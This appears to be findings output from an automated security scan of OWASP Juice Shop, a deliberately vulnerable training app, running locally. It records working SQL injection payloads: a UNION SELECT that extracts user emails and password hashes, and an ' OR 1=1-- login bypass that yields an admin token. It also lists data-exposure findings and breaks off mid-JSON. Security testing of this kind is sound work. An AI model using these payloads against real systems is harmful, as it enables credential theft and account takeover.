data.observation: GET /rest/products/search?q=')) UNION SELECT 1,email,password,name,'','','','','','','','' FROM Users-- returns HTTP 200 with JSON array containing user emails and bcrypt password hashes in the products data. Proves UNION-based extraction from Users table.
data.proof: GET /rest/products/search?q=')) UNION SELECT 1,email,password,name,'','','','','','','','' FROM Users-- returns HTTP 200 with JSON array containing user emails and bcrypt password hashes in the products data. Proves UNION-based extraction from Users table.
data.title: SQL Injection in Product Search
data.stdout: GET /rest/products/search?q=')) UNION SELECT 1,email,password,name,'','','','','','','','' FROM Users-- returns HTTP 200 with JSON array containing user emails and bcrypt password hashes in the products data. Proves UNION-based extraction from Users table.
data.body_preview: GET /rest/products/search?q=')) UNION SELECT 1,email,password,name,'','','','','','','','' FROM Users-- returns HTTP 200 with JSON array containing user emails and bcrypt password hashes in the products data. Proves UNION-based extraction from Users table.
data.script_preview:
{
  "ok": true,
  "summary": "Surface stage complete. Mapped live attack surface of OWASP Juice Shop v20.1.1 at http://127.0.0.1:3010. Confirmed multiple live surfaces including SQL injection in login and product search, excessive data exposure via API, directory listing enabled, sensitive files exposed, JWT with embedded password hash, and various API endpoints.",
  "surfaces": [
    {
      "type": "api",
      "path": "/rest/user/login",
      "method": "POST",
      "description": "SQL injection in email field - authenticated as admin using payload ' OR 1=1-- as email. Response returned JWT token with admin privileges.",
      "evidence": "POST /rest/user/login with body {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with token containing role:admin, email:admin@juice-sh.op"
    },
    {
      "type": "api",
      "path": "/rest/products/search",
      "method": "GET",
      "description": "SQL injection in search parameter q - UNION SELECT injection confirmed. Error 'SQLITE_ERROR: incomplete input' on single quote, successful UNION SELECT returning injected values.",
      "evidence": "GET /rest/products/search?q=')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master-- returned injected row with id:1, name:2, description:3, price:4"
    },
    {
      "type": "api",
      "path": "/api/Users",
      "method": "GET",
      "description": "Excessive data exposure - authenticated GET returns all users including password hashes, roles, email addresses. No access control filtering.",
      "evidence": "GET /api/Users with admin JWT returned 25 users with fields: id, email, password (hash), role, profileImage, isActive"
    },
    {
      "type": "api",
      "path": "/api/Products",
      "method": "GET",
      "description": "Product API returns full product catalog with pricing, descriptions, images. No auth required.",
      "evidence": "GET /api/Products returned all products including deleted items with deletedAt timestamps"
    },
